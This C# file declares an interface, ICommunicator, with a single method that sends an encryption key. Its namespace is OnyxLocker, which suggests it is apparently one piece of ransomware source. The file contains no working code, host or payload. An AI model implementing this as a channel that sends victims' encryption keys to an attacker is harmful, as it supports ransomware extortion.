namespace OnyxLocker.Interfaces
{
    internal interface ICommunicator
    {
        void SendData(string EncryptionKey);
    }
}